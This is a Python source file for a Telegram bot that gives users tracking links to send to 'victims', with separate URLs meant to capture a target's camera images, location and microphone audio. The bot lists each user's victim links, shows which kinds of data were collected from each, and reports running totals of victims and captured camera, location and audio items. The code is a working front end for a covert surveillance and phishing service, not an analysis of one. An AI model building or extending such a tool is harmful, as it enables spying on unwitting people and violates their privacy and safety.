import telebot, random, string, time, traceback, sys
from datetime import datetime
from config import BOT_TOKEN, CHANNEL_USERNAME, BASE_URL
from database import db

sys.stdout.reconfigure(line_buffering=True)

bot = telebot.TeleBot(BOT_TOKEN, threaded=False)

def gen_code(n=8):
    return ''.join(random.choices(string.ascii_lowercase+string.digits, k=n))

def check_ch(uid):
    try:
        m = bot.get_chat_member(CHANNEL_USERNAME, uid)
        return m.status in ('member','administrator','creator')
    except: return False

def mk_kb():
    kb = telebot.types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        telebot.types.InlineKeyboardButton("📷 New Link", callback_data="a"),
        telebot.types.InlineKeyboardButton("📋 My Links", callback_data="b"),
        telebot.types.InlineKeyboardButton("👤 Profile", callback_data="c"),
        telebot.types.InlineKeyboardButton("📊 Stats", callback_data="e"),
    )
    if CHANNEL_USERNAME:
        kb.add(telebot.types.InlineKeyboardButton("📢 Channel", url=f"https://t.me/{CHANNEL_USERNAME[1:]}"))
    return kb

def bk():
    kb = telebot.types.InlineKeyboardMarkup()
    kb.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
    return kb

@bot.message_handler(commands=['start'])
def start(m):
    uid = m.from_user.id
    un = m.from_user.username or 'User'
    fn = m.from_user.first_name or ''
    user = db.get_user(uid)
    if not user:
        db.create_user(uid, un, fn)
        txt = f"🎉 *Welcome {fn}!*\n\n✅ Unlimited links!\n📢 Just join our channel to start!"
    else:
        txt = f"👋 *Welcome back {fn}!*"
    try:
        bot.send_message(uid, txt, parse_mode='Markdown', reply_markup=mk_kb())
    except:
        try:
            bot.send_message(uid, txt, reply_markup=mk_kb())
        except: pass

@bot.callback_query_handler(func=lambda c: True)
def cb(c):
    uid = c.from_user.id
    d = c.data
    
    try:
        bot.answer_callback_query(c.id)
    except:
        pass
    
    try:
        if not c.message: return
        mid = c.message.message_id
        
        if d == 'm':
            try: bot.edit_message_text("📌 *Main Menu*", uid, mid, parse_mode='Markdown', reply_markup=mk_kb())
            except: pass
        
        elif d == 'a':
            try:
                if not check_ch(uid):
                    bot.edit_message_text(f"❌ *Join our channel first!*\n👉 {CHANNEL_USERNAME}", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                code = gen_code()
                cu = f'{BASE_URL}/camera/{code}'
                lu = f'{BASE_URL}/location/{code}'
                au = f'{BASE_URL}/audio/{code}'
                if not db.create_victim(uid, code, cu, lu, au):
                    bot.edit_message_text("❌ *Failed!*", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                txt = f"✅ *New Link Created!*\n\n🔑 Code: `{code}`\n\n📷 Camera:\n`{cu}`\n\n📍 Location:\n`{lu}`\n\n🎤 Audio:\n`{au}`"
                nk = telebot.types.InlineKeyboardMarkup()
                nk.add(telebot.types.InlineKeyboardButton("📋 My Links", callback_data="b"))
                nk.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=nk)
            except Exception as e:
                print(f"New Link error: {e}", flush=True)
        
        elif d == 'b':
            try:
                vs = db.get_user_victims(uid, 10, 0)
                if not vs:
                    bot.edit_message_text("📋 *No links yet!*\n\nClick '📷 New Link' to create one.", uid, mid, parse_mode='Markdown', reply_markup=mk_kb())
                    return
                txt = f"📋 *Your Links (Last 10)*\n\n"
                for v in vs:
                    if not v: continue
                    ic = []
                    if v.get('camera_data'): ic.append('📷')
                    if v.get('location_data'): ic.append('📍')
                    if v.get('audio_data'): ic.append('🎤')
                    st = ' '.join(ic) if ic else '⏳'
                    txt += f"`{v.get('victim_code','?')}` {st} 👁{v.get('access_count',0)}\n"
                nk = telebot.types.InlineKeyboardMarkup()
                nk.add(telebot.types.InlineKeyboardButton("🏠 Menu", callback_data="m"))
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=nk)
            except Exception as e:
                print(f"My Links error: {e}", flush=True)
        
        elif d == 'c':
            try:
                u = db.get_user(uid)
                if not u:
                    bot.edit_message_text("❌ *User not found!*", uid, mid, parse_mode='Markdown', reply_markup=bk())
                    return
                ch = '✅' if check_ch(uid) else '❌'
                vs = db.get_user_victims(uid, 9999, 0)
                dc = sum(1 for v in vs if v and (v.get('camera_data') or v.get('location_data') or v.get('audio_data')))
                txt = f"👤 *Profile*\n\n🆔 ID: `{uid}`\n👤 Name: {u.get('first_name') or u.get('username','?')}\n📅 Joined: {str(u.get('join_date','?'))[:10]}\n📢 Channel: {ch}\n🔗 Total Links: {len(vs)}\n✅ Data Collected: {dc}"
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=bk())
            except Exception as e:
                print(f"Profile error: {e}", flush=True)
        
        elif d == 'e':
            try:
                s = db.get_stats()
                txt = f"📊 *Stats*\n\n👥 Total Users: {s['users']}\n🎯 Total Victims: {s['victims']}\n📷 Camera: {s['camera']}\n📍 Location: {s['location']}\n🎤 Audio: {s['audio']}"
                bot.edit_message_text(txt, uid, mid, parse_mode='Markdown', reply_markup=bk())
            except Exception as e:
                print(f"Stats error: {e}", flush=True)
        
    except Exception as e:
        print(f"Callback error: {e}", flush=True)
        traceback.print_exc()

def run():
    print('✅ Bot polling started...', flush=True)
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60, skip_pending=True)
        except Exception as e:
            print(f'⚠️ Polling error: {e}', flush=True)
            time.sleep(3)
